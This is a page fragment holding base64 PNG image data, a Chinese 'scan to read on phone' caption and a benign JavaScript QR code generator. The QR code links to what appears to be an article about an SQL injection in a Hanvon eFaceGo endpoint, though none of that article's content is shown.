0BqVVdF0OqV9xdbF6VcDzOhjzvb56qK2wPBWQXhDUX7lZmBe7R100L18hjPuX7zCQEq943w0sBwLj9CAcRuxHP3s6IPXWwcjV7SOqi5A6OKIeEeKRi2e9Vz5IPwjqg3AY0bzovqJ64XIglbzi529g+6sTt55NrXLqHSv3X8I+1srhtafLuj3aQw3SSy52n7poHsZ6CDcvWid2vXN9kH7ywusNqVv4oDj8wbCfrU8XMlUI6odwGNG8fUSIT37mMw+pk1tf2DV5R0gPGLH75BBf5zDqdYYKfbWukEP8EKxchfnC6w2pW/ig2L6HQKYGwX5GiF4T3Uf3da6363JIXwh2XW4fUR1SB0fUYw3E03X5q2g//Z2rQ/aDoD4Rjvr1hnh7H4LbQJya55LDOEUIh6A+61YI8d9ucVjXEeJb6ZB8uty2/4vy8quJpVWsOIy9IByCva56VUDyta7QB9EhWLmKnpeLED9w/Qeq24f92n7KgkypJloBI/fcldsHjD5z+jtC/Oow8l4Pz/P22eNZD736xJUOOQMEux+i93qY6/pmuP2WNUte2s/fwPZTVp/66ijw2tRX/breuftC9ul5mOtVd+aF1Ja3AsIhaD2EQ1BdhOgQrF4VPS+vXAXED8HSKvQVXm9I3cgHxTYQyNQguDpjTbHCPIx+CIegvjOE+CG48tfeFRAfPNAaiFa+CnWxtH2oi/tcrdVh7Fu5fUDyK7+6NfI9bgPZi9f6fTew/ZTVpyaH+dQhuj6/hM67DqmDEbtPLva+nevbI2SPvbZfwzwP0SFojXtCdBhRn6h/xdXh0ed6Q7yVD8HtpyzIlPpUPSfM8xAdgvo7wjzf94P41CEcgr2vvkKIp9b7gFGHcHvplYvqED8Ee77zs7qVv+quN8Tb+RDcvod4HshTAEH1ml4FzPXKVcCY7/Urrt6xelaow7x/5ctXUesKiLe0itIqar2P0iog/lo/C2th7ofo+uwF0SE40683xFv5ENy+h3iePlU5ZKpy/SKM+ZWv+yF16is861d1kF4QLG0WkDwE9byyh95C/WJpFXJIf3nlKla89OsNqRv6oDh8D/FsNa0KuQiZulwsbwUkD3PUv8LqUWEe0kf+Owhjr9qnwp6QfGkVMPLSKiA6PMdV367Do8/1hng7H4KHgcBjWsB2zHoyZgHc/4k/BLeCxcIePd11eN4PkocH2kN0D4hHfpbvPpjX26ej9R1h7GN+X38YiKYL33MDh5+yPIZTk4twPmVrC62rdQWkvtb7gOgQ3OdqbZ9nCKmFoN6qr5DDPF+eiodv9MGcQ3QIWt+xeld0fc+vN2R/Gx+w3n7KqsntY3U2PT0Pz58OSL7Xw6iv8hCf++qbYffAWGu+I8x9fQ/r1DtXF813nOWvN6Tf0pv59j0E8nTAa+i5nbIIqe95OYz5rsM8b3/9IsQPKG0I3H8C3IS2gDG/2sMyGP3qHWHug1GHcHjg9Yb023wz3wbi03GGq/NCpmwewiFoX/N/Cu1buOpZuX10H+SM6hBujboIyUNQXVzVdV2+x20gNrvwvTdwGAhk6jDi6pgQ3yq/0iF1Ph3dB2MewvVBOBxRzwr7nnJIr14Hc33lg/gheObb5w8D2Sev9c/fwB8biE/Z6kuA+dPS/b0PPK/Tv8feE9IDRuw+ub0gfnnPn/Fep19dhOwDXP/6/fZhv/7YGwKZslMX+9fbdUhd98n1r1DfHlferu9r9muYn8l6SH7F7QVzX8/LC//YQKrZFb9/A4eBOPWOq61e9b1aD3mquh+iQ9A8hMP30bNDauUd+15nHNJP3wrdZ58/DGSfvNY/fwPbQCBThed4dkQY6/tTAMmv9LP+5mHsY78ZWtMRxh4QDnPs9e6lLhfVO8LYf5/fBrIXr/X7buAayPvufrrz/wAAAP//m6mwtwAAAAZJREFUAwCScF7j6OHpCQAAAABJRU5ErkJggg==)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/hanvon-efacego-queryDoorInfoList-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 